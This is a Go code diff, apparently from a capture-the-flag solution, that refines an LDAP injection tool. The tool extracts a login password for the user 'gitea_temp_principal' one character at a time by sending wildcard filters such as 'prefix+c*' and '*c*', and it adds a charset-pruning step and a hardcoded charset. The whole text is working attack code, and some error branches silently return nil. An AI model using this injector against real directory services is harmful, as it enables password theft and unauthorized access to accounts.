@@ -48,11 +48,9 @@ func (li *LdapInjector) TestPassword(password string) (bool, error) {
 
 func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
 	for _, c := range li.Charset {
-		ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c)))
-		if err != nil {
+		if ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
 			return "", err
-		}
-		if ok {
+		} else if ok {
 			return string(c), nil
 		}
 	}
@@ -67,6 +65,11 @@ func (li *LdapInjector) Brute() (string, error) {
 			return "", err
 		}
 		if c == "" {
+			if ok, err := li.TestPassword(result); err != nil {
+				return "", nil
+			} else if !ok {
+				return "", fmt.Errorf("Partial password found: %s", result)
+			}
 			break
 		}
 		result += c
@@ -86,8 +89,23 @@ func CreateCharset() string {
 	return charset
 }
 
+func (li *LdapInjector) PruneCharset() error {
+	var newCharset string
+	for _, char := range li.Charset {
+		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(char))); err != nil {
+			return nil
+		} else if ok {
+			newCharset += string(char)
+		}
+	}
+	li.Charset = newCharset
+
+	return nil
+}
+
 func main() {
 	c := NewLdapInjector("ldap://<ip>:<port>/login", "gitea_temp_principal")
+	c.Charset = "fklnopqrsz368"
 	password, err := c.Brute()
 	if err != nil {
 		fmt.Println(err)
